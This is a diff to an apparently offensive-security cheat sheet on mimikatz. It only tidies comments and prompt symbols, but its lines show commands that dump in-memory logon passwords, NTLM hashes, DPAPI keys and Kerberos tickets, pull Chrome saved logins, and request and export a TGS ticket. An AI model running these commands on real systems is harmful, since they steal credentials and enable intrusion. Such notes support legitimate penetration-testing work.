@@ -16,7 +16,7 @@ mimikatz# exit
 To dump credentials, hashes, tickets, etc. you can use:
 
 ```shell!
-mimikatz# sekurlsa::logonPasswords full
+mimikatz# sekurlsa::logonPasswords full # in memory passwords
 mimikatz# sekurlsa::ekeys           # dump rc4+ntlm hashes
 mimikatz# sekurlsa::dpapi           # dump DPAPI master key
 mimikatz# sekurlsa::tickets /export # dump tickets
@@ -52,9 +52,9 @@ mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Logi
 Request a TGS ticket:
 
 ```shell!
-mimikatz> kerberos::ask /target:cn # request TGS for cn
-mimikatz> base64 /out:true
-mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
+mimikatz# kerberos::ask /target:cn # request TGS for cn
+mimikatz# base64 /out:true
+mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 ```
 
 📚 See also: [pypykatz](pypykatz.md) for Linux users.
